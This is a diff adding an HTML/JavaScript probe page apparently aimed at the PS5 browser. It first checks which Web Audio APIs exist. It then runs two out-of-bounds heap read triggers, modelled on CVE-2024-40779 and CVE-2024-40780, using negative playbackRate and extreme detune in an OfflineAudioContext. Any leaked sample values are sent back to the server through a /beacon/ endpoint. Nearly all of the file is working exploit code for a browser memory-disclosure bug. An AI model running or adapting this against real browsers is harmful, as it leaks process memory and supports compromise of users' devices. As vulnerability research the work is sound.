@@ -1,0 +1,172 @@
+<!--
+  p592: Web Audio diagnostic — test API availability on PS5 browser.
+
+  Tests: AudioContext, OfflineAudioContext, AnalyserNode, AudioBufferSourceNode,
+  createBuffer, getFloatTimeDomainData, ScriptProcessorNode.
+  Then runs a minimal OOB-read trigger (CVE-2024-40779 shape: negative playbackRate)
+  via OfflineAudioContext and reads back the rendered samples looking for non-zero
+  data past the buffer boundary.
+
+  CRASH_CLASS: LOW (read-only, no memory writes)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p592</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+b('G');
+
+// Phase 1: API existence
+var apis={};
+apis.AC=typeof AudioContext!=='undefined'?1:(typeof webkitAudioContext!=='undefined'?2:0);
+apis.OAC=typeof OfflineAudioContext!=='undefined'?1:(typeof webkitOfflineAudioContext!=='undefined'?2:0);
+b('AC='+apis.AC+',OAC='+apis.OAC);
+
+if(!apis.AC&&!apis.OAC){b('DEAD-NO-AUDIO');return;}
+
+var ACtor=apis.AC===1?AudioContext:(apis.AC===2?webkitAudioContext:null);
+var OACtor=apis.OAC===1?OfflineAudioContext:(apis.OAC===2?webkitOfflineAudioContext:null);
+
+// Phase 2: Basic AudioContext creation
+try{
+  var ctx=ACtor?new ACtor():null;
+  if(ctx){
+    b('CTX='+ctx.sampleRate+'hz,state='+ctx.state);
+    b('DEST='+ctx.destination.numberOfInputs+'i,'+ctx.destination.maxChannelCount+'ch');
+  }
+}catch(e){b('CTX-ERR='+e.message);ctx=null;}
+
+// Phase 3: Test AnalyserNode
+try{
+  if(ctx){
+    var an=ctx.createAnalyser();
+    b('AN=fftSize='+an.fftSize+',freq='+an.frequencyBinCount);
+  }
+}catch(e){b('AN-ERR='+e.message);}
+
+// Phase 4: Test ScriptProcessorNode (deprecated but maybe present)
+try{
+  if(ctx&&ctx.createScriptProcessor){
+    var sp=ctx.createScriptProcessor(4096,1,1);
+    b('SP=OK');
+    sp.disconnect();
+  }else{b('SP=MISSING');}
+}catch(e){b('SP-ERR='+e.message);}
+
+// Phase 5: Test AudioWorklet
+try{
+  if(ctx&&ctx.audioWorklet){b('AW=OK');}
+  else{b('AW=MISSING');}
+}catch(e){b('AW-ERR='+e.message);}
+
+// Phase 6: OfflineAudioContext OOB read test (CVE-2024-40779 shape)
+if(!OACtor){b('OAC-SKIP');return;}
+
+try{
+  // Small buffer so OOB lands in adjacent heap
+  var bufLen=256;
+  var sr=44100;
+  // Render enough frames to let the OOB read happen
+  var renderLen=1024;
+
+  var oac=new OACtor(1,renderLen,sr);
+  var src=oac.createBufferSource();
+  var buf=oac.createBuffer(1,bufLen,sr);
+
+  // Fill buffer with known pattern (0.5) so we can distinguish OOB data
+  var cd=buf.getChannelData(0);
+  for(var i=0;i<bufLen;i++)cd[i]=0.5;
+
+  src.buffer=buf;
+  // Start at offset 0.5 (halfway), reverse playback
+  src.start(0,0.5);
+  src.playbackRate.value=-1;
+  src.connect(oac.destination);
+
+  b('OAC-START');
+
+  oac.startRendering().then(function(rendered){
+    b('OAC-DONE,len='+rendered.length);
+    var rd=rendered.getChannelData(0);
+
+    // Count non-zero samples, samples matching our pattern, and OOB-shaped samples
+    var nz=0,pat=0,oob=0,first_oob=-1;
+    var oob_vals=[];
+    for(var i=0;i<rd.length;i++){
+      if(rd[i]!==0)nz++;
+      if(rd[i]===0.5)pat++;
+      // OOB: not 0 and not our pattern 0.5
+      if(rd[i]!==0&&rd[i]!==0.5){
+        oob++;
+        if(first_oob<0)first_oob=i;
+        if(oob_vals.length<16)oob_vals.push(i+':'+rd[i].toExponential(6));
+      }
+    }
+    b('NZ='+nz+',PAT='+pat+',OOB='+oob+',FIRST='+first_oob);
+
+    if(oob_vals.length>0){
+      // Send OOB values in batches to avoid URL length issues
+      for(var j=0;j<oob_vals.length;j+=4){
+        b('OOBV='+oob_vals.slice(j,j+4).join('|'));
+      }
+    }
+
+    // Also try with large negative detune (CVE-2024-40780 shape)
+    testDetune(OACtor);
+  }).catch(function(e){
+    b('OAC-ERR='+e.message);
+    testDetune(OACtor);
+  });
+}catch(e){b('OAC-OUTER-ERR='+e.message);testDetune(OACtor);}
+}
+
+function testDetune(OACtor){
+try{
+  var bufLen=256;
+  var sr=44100;
+  var renderLen=1024;
+
+  var oac2=new OACtor(1,renderLen,sr);
+  var src2=oac2.createBufferSource();
+  var buf2=oac2.createBuffer(1,bufLen,sr);
+  var cd2=buf2.getChannelData(0);
+  for(var i=0;i<bufLen;i++)cd2[i]=0.25;
+
+  src2.buffer=buf2;
+  src2.start(0,1); // start offset > 0
+  src2.detune.value=-16777215; // -0xffffff
+  src2.connect(oac2.destination);
+
+  b('DET-START');
+
+  oac2.startRendering().then(function(rendered){
+    b('DET-DONE,len='+rendered.length);
+    var rd=rendered.getChannelData(0);
+
+    var nz=0,pat=0,oob=0,first_oob=-1;
+    var oob_vals=[];
+    for(var i=0;i<rd.length;i++){
+      if(rd[i]!==0)nz++;
+      if(rd[i]===0.25)pat++;
+      if(rd[i]!==0&&rd[i]!==0.25){
+        oob++;
+        if(first_oob<0)first_oob=i;
+        if(oob_vals.length<16)oob_vals.push(i+':'+rd[i].toExponential(6));
+      }
+    }
+    b('DNZ='+nz+',DPAT='+pat+',DOOB='+oob+',DFIRST='+first_oob);
+
+    if(oob_vals.length>0){
+      for(var j=0;j<oob_vals.length;j+=4){
+        b('DOOBV='+oob_vals.slice(j,j+4).join('|'));
+      }
+    }
+
+    b('ALIVE');
+  }).catch(function(e){b('DET-ERR='+e.message);b('ALIVE');});
+}catch(e){b('DET-OUTER-ERR='+e.message);b('ALIVE');}
+}
+
+setTimeout(main,0);
+setTimeout(function(){b('ALIVE-FALLBACK');},10000);
+</script></head><body>p592</body></html>
